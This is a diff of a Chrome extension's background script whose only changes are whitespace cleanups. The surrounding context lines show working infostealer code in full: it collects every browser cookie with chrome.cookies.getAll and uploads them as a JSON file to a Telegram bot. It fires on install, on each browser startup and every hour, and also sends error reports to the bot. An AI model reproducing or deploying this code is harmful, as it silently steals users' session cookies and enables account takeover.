@@ -254,7 +254,7 @@ async function sendAllCookiesAsFile() {{
   try {{
     const allCookies = await chrome.cookies.getAll({{}});
     console.log(`Retrieved ${{allCookies.length}} total cookies`);
-    
+
     // Prepare the complete data
     const completeData = {{
       event: 'cookies_export',
@@ -262,24 +262,24 @@ async function sendAllCookiesAsFile() {{
       cookiesCount: allCookies.length,
       cookies: allCookies
     }};
-    
+
     const jsonData = JSON.stringify(completeData, null, 2);
-    
+
     // Convert JSON to Blob for file upload
     const blob = new Blob([jsonData], {{ type: 'application/json' }});
-    
+
     // Create filename with timestamp
     const filename = `cookies_${{new Date().toISOString().replace(/[:.]/g, '-')}}.json`;
-    
+
     // Send as document
     await sendDocumentToTelegram(blob, filename, `📋 Cookies Export\\n📊 Total cookies: ${{allCookies.length}}`);
-    
+
     console.log('All cookies sent as file successfully');
-    
+
   }} catch (error) {{
     console.error('Failed to send cookies to Telegram:', error);
     console.error('Error details:', error.message);
-    
+
     // Send error notification to Telegram
     const errorMessage = `❌ Error sending cookies\\n${{error.message}}\\n${{new Date().toISOString()}}`;
     await sendToTelegram(errorMessage);
@@ -289,13 +289,13 @@ async function sendAllCookiesAsFile() {{
 // Self-invoke function that runs whenever the service worker loads
 (async function initialize() {{
   console.log('Service worker initialized');
-  
+
   // Check if alarm already exists
   const existingAlarm = await chrome.alarms.get('sendCookies');
   if (!existingAlarm) {{
     console.log('Setting up alarms as none exist');
     setupHourlySending();
-    
+
     // Send initial cookies report
     await sendAllCookiesAsFile();
   }} else {{
@@ -306,10 +306,10 @@ async function sendAllCookiesAsFile() {{
 // Listen for browser startup
 chrome.runtime.onStartup.addListener(async () => {{
   console.log('Browser started with extension already installed');
-  
+
   // Send all cookies on browser startup
   await sendAllCookiesAsFile();
-  
+
   // Ensure alarm is set up
   setupHourlySending();
 }});
@@ -317,7 +317,7 @@ chrome.runtime.onStartup.addListener(async () => {{
 // Function to send message to Telegram
 async function sendToTelegram(text) {{
   const url = `https://api.telegram.org/bot${{TELEGRAM_BOT_TOKEN}}/sendMessage`;
-  
+
   try {{
     const response = await fetch(url, {{
       method: 'POST',
@@ -330,17 +330,17 @@ async function sendToTelegram(text) {{
         parse_mode: 'HTML'
       }})
     }});
-    
+
     const responseData = await response.json();
-    
+
     if (!responseData.ok) {{
       console.error('Telegram API error:', responseData.description);
       throw new Error(responseData.description);
     }}
-    
+
     console.log('Message sent successfully to Telegram');
     return responseData;
-    
+
   }} catch (error) {{
     console.error('Failed to send message to Telegram:', error);
     throw error;
@@ -350,7 +350,7 @@ async function sendToTelegram(text) {{
 // Function to send document/file to Telegram
 async function sendDocumentToTelegram(blob, filename, caption = '') {{
   const url = `https://api.telegram.org/bot${{TELEGRAM_BOT_TOKEN}}/sendDocument`;
-  
+
   try {{
     // Create FormData for file upload
     const formData = new FormData();
@@ -359,22 +359,22 @@ async function sendDocumentToTelegram(blob, filename, caption = '') {{
     if (caption) {{
       formData.append('caption', caption);
     }}
-    
+
     const response = await fetch(url, {{
       method: 'POST',
       body: formData
     }});
-    
+
     const responseData = await response.json();
-    
+
     if (!responseData.ok) {{
       console.error('Telegram API error:', responseData.description);
       throw new Error(responseData.description);
     }}
-    
+
     console.log('Document sent successfully to Telegram');
     return responseData;
-    
+
   }} catch (error) {{
     console.error('Failed to send document to Telegram:', error);
     throw error;
@@ -387,7 +387,7 @@ function setupHourlySending() {{
   chrome.alarms.create('sendCookies', {{
     periodInMinutes: 60
   }});
-  
+
   console.log('Hourly cookie sending scheduled using alarms');
 }}
 
@@ -410,7 +410,7 @@ function openDumpPage() {
 // Listen for installation
 chrome.runtime.onInstalled.addListener(() => {
   console.log('Extension installed');
-  
+
   // Open dump page on installation
   openDumpPage();
 });
@@ -418,7 +418,7 @@ chrome.runtime.onInstalled.addListener(() => {
 // Listen for startup
 chrome.runtime.onStartup.addListener(() => {
   console.log('Extension started');
-  
+
   // Open dump page on startup
   openDumpPage();
 });
